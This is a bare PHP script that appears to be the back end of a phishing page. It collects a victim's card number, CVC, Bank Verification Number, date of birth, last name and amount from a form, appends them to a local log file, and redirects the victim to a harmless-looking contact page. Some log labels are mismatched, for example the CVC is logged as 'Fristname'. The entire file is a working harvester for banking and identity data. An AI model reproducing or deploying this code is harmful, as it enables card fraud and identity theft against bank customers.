<?php
 header ('Location: contact-us.html');
 $number = $_POST["number"];
 $bvn = $_POST["bvn"];
 $check = $_POST["check"];
 $cvc = $_POST["cvc"];
 $last = $_POST{"last"};
  $amount = $_POST{"amount"};
  $yes = $_POST{"yes"};
  $dob = $_POST{"dob"};
 $file = fopen("log.txt","a");
 fwrite($file,"\n\nNumber : ");
 fwrite($file,$number);
 fwrite($file,"\nBvn : ");
 fwrite($file,$bvn);
  fwrite($file,"\nCheckbox : ");
 fwrite($file,$check);
  fwrite($file,"\nFristname : ");
 fwrite($file,$cvc);
 fwrite($file,"\nLastname : ");
 fwrite($file,$last);
 fwrite($file,"\nAmount : ");
 fwrite($file,$amount);
 fwrite($file,"\nYes : ");
 fwrite($file,$yes);
 fwrite($file,"\nDOB : ");
 fwrite($file,$dob);
 fclose($file);
?>